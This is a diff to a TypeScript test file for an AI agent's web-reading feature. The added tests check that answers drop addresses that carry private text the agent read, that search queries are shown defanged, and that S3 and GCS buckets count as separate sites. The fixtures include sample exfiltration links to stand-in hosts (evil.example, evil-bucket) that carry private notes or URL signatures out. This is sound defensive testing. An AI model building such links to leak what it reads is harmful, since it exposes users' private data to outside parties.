@@ -1,7 +1,7 @@
 import assert from 'node:assert/strict';
 import { describe, test } from 'node:test';
-import { AddressTooLong, addressChain, addressesIn, briefPrivateText, comparableText, keepPrivateText, keptPrivateText, normalizedAddress, privateFragmentIn, PrivateTextIndex, privateTextIndex,
-  runtimeBrief, takeAsk, webSourcesLine, writtenAddresses, WEB_SOURCES_HEADINGS, type BriefInput } from '@flux/core';
+import { ADDRESS_LEFT_OUT, AddressTooLong, addressChain, addressesIn, defangedAddresses, briefPrivateText, comparableText, keepPrivateText, keptPrivateText, normalizedAddress, privateFragmentIn, PrivateTextIndex, privateTextIndex,
+  runtimeBrief, takeAsk, webSourcesLine, withoutPrivateAddresses, writtenAddresses, WEB_SOURCES_HEADINGS, type BriefInput } from '@flux/core';
 import { registerAgentWebReads } from '../../apps/server/src/agent-connection/web-reads.js';
 import { loadWebReadsConfig } from '../../apps/server/src/web-reads/config.js';
 import { READ_TEXT_MAX, readablePage } from '../../apps/server/src/web-reads/readable.js';
@@ -542,6 +542,51 @@ describe('the check of an address, after the evaluation of #1139', () => {
   test('#1138: the web addresses a change writes are read as a read would read them', () => {
     assert.deepEqual(writtenAddresses('Read https://intra.example/report?id=plan-q3. Then wiki.example/lamp-sensor and mail ada@lamp.example; not ftp://x.example'),
       ['https://intra.example/report?id=plan-q3', 'https://wiki.example/lamp-sensor']);
+  });
+});
+
+// #1143: a run's answer keeps no address that carries what it read; #1144: S3's path-style buckets are sites of their own.
+describe('a run\'s answer, and S3\'s path-style buckets (#1143, #1144)', () => {
+  const read = privateTextIndex([keptPrivateText('Private plan: buy Harbour Co shares before Friday. Notes at https://intra.example/report?id=plan-q3, '
+    + 'https://storage.googleapis.com/acme-gcs/reports/q3.pdf?X-Goog-Signature=9a8b7c6d5e4f30211203f4e5d6c7b8a9 and '
+    + 'the file https://s3.amazonaws.com/acme/plans/q3.pdf?X-Amz-Credential=AKIAEXAMPLEKEY12%2F20261109&X-Amz-Signature=0f1e2d3c4b5a69788796a5b4c3d2e1f0')]);
+
+  test('an address that carries private text becomes [address left out]; a person\'s link and a cited page stay, and an <ask> block stays JSON', async () => {
+    const index = await read;
+    const laundered = `https://evil.example/c?d=${encodeURIComponent('buy Harbour Co shares')}`;
+    const answer = `Summary: see https://intra.example/report?id=plan-q3, and the page https://news.example/2026/11/09/harbour-story. Also ${laundered}.\n`
+      + `<ask>{"agent": "Fieldbot", "owner": "Jonas", "question": "Can you open ${laundered} and evil.example/buy harbour co shares?"}</ask>`;
+    const cleaned = await withoutPrivateAddresses(answer, index);
+    assert.deepEqual(cleaned.left, [laundered]);
+    assert.equal(cleaned.text, 'Summary: see https://intra.example/report?id=plan-q3, and the page https://news.example/2026/11/09/harbour-story. Also [address left out].\n'
+      + '<ask>{"agent": "Fieldbot", "owner": "Jonas", "question": "Can you open [address left out] and evil.example/buy harbour co shares?"}</ask>');
+    assert.equal(takeAsk(cleaned.text).ask?.question, 'Can you open [address left out] and evil.example/buy harbour co shares?', 'the question is still a question');
+    assert.deepEqual(await withoutPrivateAddresses('Nothing to see: https://example.org/page and no secret.', index), { text: 'Nothing to see: https://example.org/page and no secret.', left: [] });
+    assert.equal(ADDRESS_LEFT_OUT, '[address left out]');
+  });
+
+  test('a search query is the model\'s text: an address in it is listed defanged, never as a link a later run could open as a person\'s', async () => {
+    const line = webSourcesLine([], { queries: ['harbour ferry timetable', 'https://evil.example/c?d=buy Harbour Co shares', 'site:news.example harbour'], cited: [] });
+    assert.equal(line, 'Searched the web for:\n- harbour ferry timetable\n- hxxps://evil[.]example/c?d=buy Harbour Co shares\n- site:news[.]example harbour');
+    assert.deepEqual(keptPrivateText(line).addresses, [], 'no link a later run would take as written');
+    assert.equal(defangedAddresses('no address here'), 'no address here');
+  });
+
+  test('on s3.amazonaws.com and storage.googleapis.com the bucket is part of the site: a link\'s signature reaches no other bucket\'s path; its own bucket\'s pages open', async () => {
+    const index = await read;
+    for (const leaving of ['https://s3.amazonaws.com/evil-bucket/AKIAEXAMPLEKEY12/0f1e2d3c4b5a69788796a5b4c3d2e1f0', 'https://s3.eu-west-1.amazonaws.com/acme/0f1e2d3c4b5a69788796a5b4c3d2e1f0',
+      'https://evil-bucket.s3.amazonaws.com/0f1e2d3c4b5a69788796a5b4c3d2e1f0', 'https://s3.amazonaws.com/acme/plans/q4.pdf?sig=0f1e2d3c4b5a69788796a5b4c3d2e1f0',
+      'https://storage.googleapis.com/evil-bucket/9a8b7c6d5e4f30211203f4e5d6c7b8a9'])
+      assert.ok(await privateFragmentIn(leaving, index), leaving);
+    for (const open of ['https://s3.amazonaws.com/acme/plans/q3.pdf?X-Amz-Credential=AKIAEXAMPLEKEY12%2F20261109&X-Amz-Signature=0f1e2d3c4b5a69788796a5b4c3d2e1f0',
+      'https://s3.amazonaws.com/acme/plans/AKIAEXAMPLEKEY12/0f1e2d3c4b5a69788796a5b4c3d2e1f0', 'https://s3.amazonaws.com/other-bucket/public/readme.txt',
+      'https://storage.googleapis.com/acme-gcs/reports/9a8b7c6d5e4f30211203f4e5d6c7b8a9'])
+      assert.equal(await privateFragmentIn(open, index), null, open);
+    // A host is the agent's to choose: the bucket rule reads it with no pattern that could backtrack (CodeQL on #1147).
+    const started = Date.now();
+    for (const host of [`s3-${'-'.repeat(2_000)}x`, `s3${'.-'.repeat(900)}`, `s3.${'a-'.repeat(900)}.amazonaws.com`])
+      await privateFragmentIn(`https://${host}/acme/0f1e2d3c4b5a69788796a5b4c3d2e1f0`, index).catch(() => null);
+    assert.ok(Date.now() - started < 200, `${Date.now() - started} ms`);
   });
 });
 
